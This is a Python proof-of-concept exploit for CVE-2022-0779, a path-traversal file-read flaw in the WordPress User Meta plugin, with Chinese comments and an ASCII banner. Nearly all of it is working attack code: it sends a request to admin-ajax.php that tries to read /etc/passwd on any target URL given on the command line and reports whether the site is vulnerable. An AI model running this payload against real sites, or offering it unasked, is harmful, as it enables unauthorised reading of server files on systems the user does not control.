'''
Author: twsec
Date: 2022-12-16 15:41:18
LastEditors: twsec
LastEditTime: 2022-12-19 11:14:06
Description: wordpress插件User Meta本地文件枚举漏洞-POC
'''
def usage():
    #生成一个图案
    print(''' 

  __                                    
_/  |_ __  _  __  ______  ____    ____  
\   __\\ \/ \/ / /  ___/_/ __ \ _/ ___\ 
 |  |   \     /  \___ \ \  ___/ \  \___ 
 |__|    \/\_/  /____  > \___  > \___  >
                     \/      \/      \/ 

python3 CVE-2022-0779-POC.py -t <target> -p <pf_nonce>
-t url: 目标地址
-pf pf_nonce: 源代码中的pf_nonce
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')

import getopt
import sys
import requests

def getInfo(url, pf_nonce):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept":"*/*",
}

    url1 = "wp-admin/admin-ajax.php"
    url = url + url1
    data = {
        'field_name':'test',
        'filepath':'/../../../../../../../../etc/passwd',
        'field_id':'um_field_4',
        'form_key':'Upload',
        'action':'um_show_uploaded_file',
        'pf_nonce':pf_nonce,
        'is_ajax':True,
        'field_name':'test',
    }

    r = requests.post(url,headers=headers,data=data)
    if "umRemoveFile" in r.text:
        print(r.text)
        print("+++++存在漏洞！+++++")
    else:
        print("+++++不存在漏洞！+++++")

if __name__ == '__main__':
    usage()
    try:
#从命令行获取两个参数

        opts, args = getopt.getopt(sys.argv[1:], "ht:p:")
    except getopt.GetoptError:
        print('CVE-2022-0779-POC.py -t <target> -p <pf_nonce>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('CVE-2022-0779-POC.py -t <target> -p <pf_nonce>')
            sys.exit()

        elif opt in ("-t", "--target"):
            target = arg
            #print(target)
        elif opt in ("-p", "--pf_nonce"):
            pf_nonce = arg
            #print(pf_nonce)

            getInfo(target,pf_nonce)
        
